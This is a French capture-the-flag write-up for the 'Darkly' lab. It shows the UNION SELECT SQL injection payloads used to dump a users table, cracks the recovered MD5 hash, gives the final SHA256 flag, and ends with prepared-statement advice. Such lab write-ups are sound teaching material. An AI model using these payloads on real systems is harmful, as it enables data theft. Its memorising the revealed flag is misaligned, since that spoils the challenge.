# Darkly - Writeup : Accès à une page via paramètre hashé

## Analyse

En testant l’utilisateur avec `id = 5`, on observe une valeur intéressante :

```
ID: 5 
First name: Flag
Surname : GetThe
````

Une première tentative d’injection SQL :

```sql
ID: 1 UNION SELECT commentaire, NULL FROM users
````

Donne le résultat suivant :

```
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname: 
```

On remarque que le mot de passe à déchiffrer manque.

En testant d’autres combinaisons, on obtient finalement :

```sql
1 UNION SELECT commentaire, countersign FROM users
```

Résultat :

```
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname: 5ff9d0165b4f92b14994e5c685cdce28
```

---

## Exploitation

1. Hash MD5 récupéré :

```
5ff9d0165b4f92b14994e5c685cdce28
```

2. Décodage MD5 :

```
FortyTwo
```

3. Passage en lowercase :

```
fortytwo
```

4. Hash en SHA256 :

```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

---

## Ressources

* [Outil SHA256 en ligne](https://emn178.github.io/online-tools/sha256.html)
* [Décryptage MD5 en ligne](https://md5decrypt.net/)

---

## Bonnes pratiques

* Utiliser des **requêtes préparées (prepared statements)**
* Ne jamais concaténer directement les entrées utilisateur dans une requête SQL
* Limiter les permissions de la base de données
* Implémenter des contrôles de validation côté serveur

